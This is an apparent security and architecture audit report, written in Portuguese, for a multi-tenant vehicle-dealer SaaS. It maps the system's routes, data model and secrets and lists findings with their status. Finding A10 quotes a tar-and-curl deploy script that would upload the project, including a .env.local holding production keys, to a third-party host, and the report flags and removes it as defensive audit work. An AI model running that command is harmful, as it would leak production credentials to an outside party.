# Fase 1 — Mapa do Sistema

> Artefato de auditoria. Levantado em 2026-07-18, atualizado em 2026-07-20 após o rebrand e a limpeza. Branch `feat/redesign-visual-e-correcoes`.
> Este documento é a base de referência das fases 2–20.

## 1. Identidade do sistema

**Gestor de Pátio**, produto da **Orvalho Digital** — SaaS multi-tenant para revendas de veículos.
Cada lojista (tenant) gerencia estoque, leads/CRM, fluxo de vendas e um site público próprio.

| Dimensão | Valor |
|---|---|
| Código de aplicação | 40.196 linhas, 190 arquivos `.ts`/`.tsx` |
| Arquivos versionados | 347 (fora as skills em `.claude/skills/`) |
| Frontend | React 19, Vite 6, TypeScript 5.8, Tailwind 4, React Router 7 |
| Backend gerenciado | Supabase (Auth, Postgres com RLS, Storage) |
| Backend próprio | 11 funções serverless na Vercel (`api/`, 1.485 linhas) |
| Hospedagem | Vercel (SPA + funções) |

## 2. Contexto — sistemas externos

| Sistema | Uso | Onde |
|---|---|---|
| **Supabase** | Auth, banco, storage de imagens | cliente + servidor |
| **Asaas** | Assinaturas recorrentes, faturas, portal de cobrança | `api/create-asaas-payment.ts`, `api/get-asaas-billing-portal.ts`, `api/webhook-asaas.ts` |
| **OpenAI** | Geração de descrição, SEO, insights de matching | `api/openai/*` |
| **OpenRouter** | Fallback automático da OpenAI | `api/openai/*` |
| **Vercel API** | Registro/remoção de domínio customizado do lojista | `api/register-custom-domain.ts`, `api/remove-custom-domain.ts` |
| **wdapi2.com.br** | Consulta de placa | `api/consulta-placa.ts` |
| **n8n** (`webhook.orvalhodigital.com.br`) | Integração WhatsApp: criar instância, verificar conexão, botões de interesse/test-drive/troca/simulação | chamado do frontend |
| **WhatsApp** (`wa.me`) | Deep links de contato | frontend |

> ⚠️ O n8n é chamado **direto do frontend**, não passa pelas funções serverless. Fronteira de confiança a revisar na Fase 6.

## 3. Superfície de rotas

### 3.1 App do lojista (autenticado)
`/dashboard` · `/inventory` (+`/new`, `/edit/:id`) · `/motorcycles` · `/leads` (+`/new`, `/edit/:id`, `/:id`, `/:id/action/:actionType`) · `/agenda` · `/sales-closed` · `/sales-flow` · `/settings` · `/support` · `/website` · `/estrutura-ecv` · `/diagnostics`

### 3.2 Autenticação
`/login` · `/nova-conta` · `/redefinir-senha`

### 3.3 Público (sem autenticação)
`/site/:slug` · `/site/:slug/veiculo/:id` · `/politica-de-privacidade` · `/termos-de-uso` · `/contrato-saas`
\+ resolução por **domínio customizado** (`CustomDomainRedirect`, `CustomDomainVehicleDetail`)

### 3.4 Painel administrativo — `/paineldoadm/*`
`setup` · `login` · index (dashboard) · `users` (+`/:userId`) · `sales` · `audit-log` · `settings` · `notifications` · `quotes` · `plans` · `onboarding` · `tickets` · `user/:userId/*` (impersonação — o admin navega o app do lojista)

Todas as rotas usam `React.lazy` — code splitting já está aplicado.

## 4. Camadas e módulos

```
src/
├── App.tsx                 rotas + composição de providers
├── contexts/   (6)         estado global
├── pages/      (19 + 6 públicas)
├── admin/      (16 telas)
├── components/ (40 raiz + 11 subpastas de domínio, incl. ui/)
├── services/   (13)        acesso a dados
├── hooks/ lib/ utils/ schemas/ data/ types.ts
└── api/        (11 funções serverless)
```

### 4.1 Serviços (`src/services/`)
`leadService` · `vehicleService` · `motorcycleService` · `salesFlowService` · `guaranteeService` · `plateService` · `planService` · `profileService` · `websiteService` · `notificationService` · `ticketService` · `auditLogService` · `openaiService`

### 4.2 Contextos
| Contexto | Papel | Consumidores |
|---|---|---|
| `DataContext` | **God context** (506 linhas): sessão, perfil, leads, veículos, motos, equipe, paginação | 32 |
| `ToastContext` | notificações de UI | 17 |
| `ThemeContext` | tema | 2 |
| `AuthContext` | re-export de 1 linha → `DataContext` | 3 |
| `InventoryContext` | re-export de 1 linha → `DataContext` | **0** |
| `LeadContext` | re-export de 1 linha → `DataContext` | **0** |

## 5. Modelo de dados (21 tabelas referenciadas em código)

| Domínio | Tabelas |
|---|---|
| Identidade / tenant | `profiles`, `avatars` |
| Estoque | `vehicles`, `motorcycles` |
| CRM | `leads`, `lead_communications`, `campaigns` |
| Comercial | `plans`, `guarantee_configs` |
| Suporte | `support_tickets`, `ticket_messages`, `support_attachments` |
| Notificações | `notifications`, `notification_rules`, `notification_templates`, `broadcast_history` |
| Onboarding | `onboarding_sessions` |
| Sistema / admin | `system_settings`, `system_assets`, `admin_audit_logs`, `motivation_quotes` |

**Funções RPC:** `claim_first_admin`, `check_has_admins`, `append_lead_interaction`, `admin_update_user_password`

**Isolamento multi-tenant:** RLS do Postgres por coluna `user_id` (documentado em `ARCHITECTURE.md`). Verificação efetiva das políticas → **Fase 3**.

## 6. Configuração e segredos

| Variável | Escopo | Correto? |
|---|---|---|
| `VITE_SUPABASE_URL`, `VITE_SUPABASE_ANON_KEY` | cliente (vai ao bundle) | ✅ são públicas por design |
| `SUPABASE_SERVICE_ROLE_KEY` | só `api/` | ✅ |
| `ASAAS_API_KEY`, `ASAAS_API_URL`, `ASAAS_WEBHOOK_TOKEN` | só `api/` | ✅ |
| `OPENAI_API_KEY`, `OPENROUTER_API_KEY` | só `api/` | ✅ |
| `VERCEL_API_TOKEN`, `VERCEL_PROJECT_ID` | só `api/` | ✅ |
| `APIPLACAS_TOKEN`, `WEBHOOK_SECRET` | só `api/` | ✅ |

**Nenhum segredo vaza para o bundle do cliente.** `.gitignore` cobre `.env*`; nenhum `.env` está versionado. Detalhamento na Fase 2.

## 7. Achados estruturais desta fase

### 🟠 A1 — 57% do acesso a dados ignora a camada de serviços
105 chamadas `.from()` espalhadas em **34 componentes/páginas/telas admin**, contra 79 nos 13 serviços.

Concentração: `AdminNotifications` (12), `AdminOnboarding` (9), `AdminDashboard` (9), `UserArea` (8), `AdminPlans` (6), `VehicleForm` (5), `AdminUsers` (5), `AdminQuotes` (5).

**Por que importa:** regra de tenant, tratamento de erro e validação ficam duplicados e inconsistentes. Cada ponto desses é um lugar onde o isolamento entre lojistas pode falhar.
→ Auditado nas Fases 3, 5 e 11; refatorado na Fase 14.

### 🟠 A2 — Três sistemas de migração de banco em paralelo
- `supabase/migrations/` — 12 arquivos com timestamp (correto)
- `sql/` — 35 scripts ad-hoc sem ordenação (`fix_rls_recursion.sql`, `fix_admin_lockout.sql`, `_check_fase1*.sql`)
- raiz do repo — 8 `.sql` soltos

Não há como reconstruir o schema de forma determinística. **Bloqueador para comercialização.**
→ Fase 3.

### 🟡 A3 — Código morto nos contextos
`InventoryContext.tsx` e `LeadContext.tsx` são shims de 1 linha com zero consumidores. Os hooks `useInventory` e `useLeads` são definidos e re-exportados, mas nunca usados.
→ Fase 14.

### 🟡 A4 — `DataContext` é um god context
506 linhas concentrando sessão, perfil, leads, veículos, motos, equipe e paginação, consumido por 32 componentes. Qualquer mudança de estado propaga re-render amplo.
→ Fases 12 e 14.

### 🟡 A5 — Componentes grandes demais
7 arquivos acima de 950 linhas: `PublicSiteHome` (1.336), `Inventory` (1.275), `MotorcycleInventory` (1.271), `VehicleForm` (1.163), `LeadForm` (1.086), `LeadManager` (982), `PublicVehicleDetail` (957).
`Inventory` e `MotorcycleInventory` são fortes candidatos a duplicação.
→ Fase 14.

### 🔴 A6 — Cobertura de testes ~0
3 arquivos de teste para 41.030 linhas. `jest.config.js` presente, mas o projeto usa Vite (esperado: Vitest) — o harness pode nem estar funcional.
→ Fase 15.

### 🔴 A7 — Sem CI
Nenhum workflow. Nada valida build, tipos ou testes antes do deploy.
→ Fase 18.

### 🟡 A8 — Frontend chama n8n diretamente
Webhooks de WhatsApp invocados do navegador, fora das funções serverless — sem autenticação server-side no caminho.
→ Fase 6.

### 🔴 A9 — 29 erros de TypeScript, e o build não os detecta
`npx tsc --noEmit` retorna **29 erros**. `npm run build` passa mesmo assim, porque o Vite transpila sem checar tipos. Ou seja: **hoje é possível fazer deploy de código quebrado sem nenhum aviso.**

| Arquivo | Erros |
|---|---|
| `src/pages/public/PublicSiteHome.tsx` | 7 |
| `src/contexts/DataContext.tsx` | 4 |
| `src/components/MotorcycleInventory.tsx` | 4 |
| `src/components/PublicFooter.tsx` | 3 |
| `src/components/AppTour.tsx` | 3 |
| outros 8 arquivos | 1 cada |

Classes de erro observadas:
- **Comparações impossíveis** em `PublicSiteHome` (6 ocorrências `TS2367`): compara tema `'bold' | 'modern' | 'luxury'` com `'glass'` e `'premium'` — valores que não existem no tipo. São ramos de renderização **que nunca executam**. Provável funcionalidade de tema silenciosamente morta.
- **Contratos divergentes** em `DataContext`: `refreshProfile()` declarado `Promise<void>` mas retorna `Promise<Profile>`; idem `Lead`/`void` em `LeadsPage`.
- **Campos ausentes no tipo**: `website_tiktok`, `dark_mode`, `user`, `forcedTheme` são usados mas não existem nos tipos correspondentes.
- **Conversão Moto→Veículo incompleta** em `MotorcycleInventory` (`isServiceHistoryComplete` faltando, `engine: string` vs `EngineType`).

→ Corrigido na Fase 2 (tipagem/config) e Fase 18 (gate de CI que impeça regressão).

### 🔴 A10 — Script versionado que exfiltraria os segredos do projeto
`.kilo/skills/vercel-deploy/scripts/deploy.sh` está **versionado no Git**. Ele executa:

```sh
tar -czf "$TARBALL" -C "$PROJECT_PATH" --exclude='node_modules' --exclude='.git' .
curl -s -X POST "https://claude-skills-deploy.vercel.com/api/deploy" -F "file=@$TARBALL"
```

Exclui apenas `node_modules` e `.git`. **Não exclui `.env.local`**, que existe na raiz (2.296 bytes) e contém `SUPABASE_SERVICE_ROLE_KEY`, `ASAAS_API_KEY`, `OPENAI_API_KEY` e `VERCEL_API_TOKEN`.

Não há evidência de que tenha sido executado. Mas está no repositório, é executável, e qualquer IA ou dev que o rodasse enviaria as credenciais de produção para um host de terceiro em uma requisição.

**Ação recomendada:** remover do repositório. Se as credenciais tiverem sido expostas alguma vez, rotacioná-las.
→ Decisão do dono do projeto. Bloqueado até resposta.

### ✅ A11 — Duas landing pages, nenhuma conectada — **RESOLVIDO**
`Landing/` (raiz) e `src/pages/Landing/` eram implementações paralelas do mesmo design, nenhuma delas referenciada por rota ou import.

**Resolução (2026-07-18):** as duas foram removidas por decisão do dono do projeto. 18 arquivos. Design preservado no commit `d61f328` — instruções de recuperação em `docs/DECISOES-E-ROADMAP.md`.

### 🟡 A12 — Documentação proliferada e sem hierarquia
21 arquivos `.md` na raiz + 10 em `docs/`, vários se contradizendo.

**Parcialmente resolvido em 2026-07-18:** os 6 documentos de design foram consolidados em 2 (`docs/DESIGN_GUIDELINES.md` + `docs/BRANDING.md`), e `.agents/AGENTS.md` — que mandava usar a fonte Outfit e descrevia a cor primária como lavanda, ambos divergentes do código — virou ponteiro. Ver `docs/DECISOES-E-ROADMAP.md`.

**Ainda pendente:** três versões de `analise-funcional-sistema` (`.md`, `-v2.md`, `-v3.md`) em `docs/plans/` sem indicação de qual vale; `TEST_CHECKLIST.md` + `TEST_SUITE.md`; `DEPLOYMENT.md` + `QUICK_DEPLOY.md`; `CUSTOM_DOMAIN_ROUTING.md` + `DOMAIN_ROUTING_FLOW.md`.
→ Fase 19.

### ✅ A13 — Duas identidades de marca em conflito — **RESOLVIDO**
`Otimizza` (amarelo `#F79F1B`) e `Orvalho` (roxo `#5B46E5`) coexistiam na documentação, com o código usando exclusivamente o roxo.

**Resolução (2026-07-20):** Orvalho Digital é a marca, **Gestor de Pátio** é o produto. 204 ocorrências de `Otimizza`/`nLeads` substituídas em 35 arquivos; `OtimizzaBrandLogo.tsx` e `useBrandTheme.ts` removidos; `OtimizzaLogo` → `OrvalhoLogo`. Ver `docs/DECISOES-E-ROADMAP.md`.

### 🔴 A14 — CORS bloqueava o domínio Orvalho no backend — **CORRIGIDO**
As 10 funções em `api/` listavam apenas `nleads.pro`/`nleads.com.br` em `ALLOWED_ORIGINS`, enquanto `SYSTEM_HOSTS` no frontend já aceitava `orvalhodigital.com.br`. Com o fallback silencioso `ALLOWED_ORIGINS.includes(origin) ? origin : ALLOWED_ORIGINS[0]`, todo acesso pelo domínio Orvalho recebia cabeçalho divergente e era **bloqueado pelo navegador**: cobrança Asaas, portal de faturas, consulta de placa, os 3 recursos de IA, domínios customizados e webhooks.

Sintoma da migração de marca ter sido feita no frontend sem chegar ao backend. **Corrigido em 2026-07-20.**

**Lição estrutural:** a lista `ALLOWED_ORIGINS` está **duplicada em 10 arquivos**. Foi por isso que divergiu. Consolidar em módulo compartilhado → Fase 6.

### Estado da linha de base
- `npm run build` — ✅ passa (saída correta em `dist/assets/`, com `.gz` e `.br`)
- `npx tsc --noEmit` — ❌ 29 erros
- testes — ❌ praticamente inexistentes
- CI — ❌ ausente

## 8. Ordem de fronteiras a validar

1. Navegador ↔ Supabase (RLS é a **única** barreira de tenant) — Fase 3
2. Navegador ↔ funções serverless (`api/`) — Fase 6
3. Navegador ↔ n8n — Fase 6
4. Funções serverless ↔ Asaas / OpenAI / Vercel / wdapi2 — Fases 6 e 7
5. Admin ↔ dados de lojista (impersonação `user/:userId/*`) — Fase 11

---

## 9. Status dos achados

Reverificado em 2026-07-20.

| # | Achado | Sev. | Status | Fase |
|---|---|:---:|---|:---:|
| A1 | Acesso a dados fora da camada de serviços — 44 escritas diretas | 🟠 | quantificado; refatorar na Fase 14 | 14 |
| A2 | Três sistemas de migração de banco em paralelo | 🔴 | ✅ resolvido — só `supabase/migrations/`; histórico arquivado | 3 |
| A3 | `InventoryContext` / `LeadContext` sem consumidores | 🟡 | aberto — confirmado | 14 |
| A4 | `DataContext` é god context (506 linhas, 32 consumidores) | 🟡 | aberto | 12/14 |
| A5 | 7 arquivos acima de 950 linhas | 🟡 | aberto — confirmado | 14 |
| A6 | Cobertura de testes ~zero | 🔴 | aberto | 15 |
| A7 | Sem CI | 🔴 | aberto | 18 |
| A8 | Frontend chama n8n diretamente | 🟡 | aceito — sem vazamento; rate-limit no n8n vai ao checklist | 6 |
| A9 | 29 erros de TypeScript que o build não detecta | 🔴 | ✅ resolvido — 0 erros, build com portão | 2 |
| A10 | Script versionado que exfiltraria segredos | 🔴 | ✅ resolvido | — |
| A11 | Duas landing pages órfãs | 🟡 | ✅ resolvido | — |
| A12 | Documentação proliferada e contraditória | 🟡 | parcial — design consolidado; resta `docs/plans/`, TEST_*, DEPLOY* | 19 |
| A13 | Duas identidades de marca em conflito | 🔴 | ✅ resolvido | — |
| A14 | CORS bloqueava o domínio Orvalho | 🔴 | ✅ resolvido | — |
| A15 | RLS: políticas do site público limitadas ao papel `anon` | 🟠 | ✅ resolvido — políticas agora {anon,authenticated} | 3 |
| A16 | `createPublicLead` é código morto que falharia (sem política INSERT para `anon`) | 🟡 | aberto | 14 |

| A17 | **Escalonamento de privilégio: qualquer lojista pode se tornar admin** | 🔴 | ✅ **resolvido e testado** — 4/4 cenários bloqueados em 2026-07-20 | 3 |
| A18 | Upgrade de plano gratuito: `plan`/`plan_status` editáveis pelo próprio usuário | 🔴 | ✅ **resolvido e testado** | 3 |
| A19 | `lead_communications` e `system_settings` com RLS ligado e zero políticas | 🟠 | ✅ resolvido — 4 e 5 políticas criadas | 3 |
| A20 | **Webhook do Asaas grava colunas inexistentes — cliente paga e o plano não ativa** | 🔴 | ✅ resolvido — 3 colunas criadas | 3 |
| A21 | Banco sem tabela de controle de migrações | 🔴 | ✅ resolvido — 16 migrações registradas | 3 |
| A23 | **Limites de plano não existiam no banco** — migração nunca aplicada | 🔴 | ✅ resolvido — 3 triggers ativos | 3 |
| A22 | **`SUPABASE_ACESS_TOKEN` exposto em texto plano em log de ferramenta** | 🔴 | adiado por decisão do dono — rotacionar antes da comercialização | — |

| A24 | **RPC `admin_update_user_password` sem verificação: qualquer anônimo assume qualquer conta** | 🔴 | ✅ resolvido e verificado — anon EXECUTE=false | 4 |
| A25 | Senha mínima do provedor é 6 (Supabase Auth) | 🟡 | checklist de comercialização | — |

| A26 | Três padrões de tratamento de erro nos services | 🟡 | padronizar na Fase 14 | 14 |

| A27 | 5 escritas com erro silencioso (supabase-js nao lanca) — venda em massa mostrava sucesso ao falhar | 🔴 | resolvido | 5 |

| A28 | Webhook de leads falhava aberto (aceitava sem token se o secret sumisse) | 🔴 | resolvido — fail-closed | 6 |

| A29 | Planos: slug `free` num plano pago + webhook achatava tudo em `plan:pro` (Básico ganhava ilimitado) | 🔴 | ✅ resolvido — slug `basico`, webhook grava plano real, helper único | 7 |
| A30 | Sem registro/controle de consumo de IA por usuário (custo OpenAI/OpenRouter) | 🟡 | aberto — Fase 7 continuação | 7 |
| A31 | **Sem paywall de expiração**: TrialExpired importado mas nunca renderizado; downgrade só cobre `pro` | 🔴 | documentado — decisão de produto | futura |

**Linha de base para a Fase 7 (em pausa):** billing auditado; A29 aguarda decisão do dono

**Linha de base para a Fase 4:** build ✅ · typecheck ✅ 0 erros · RLS ✅ 21/21 tabelas · migrações ✅ 16 registradas · testes ❌ · CI ❌
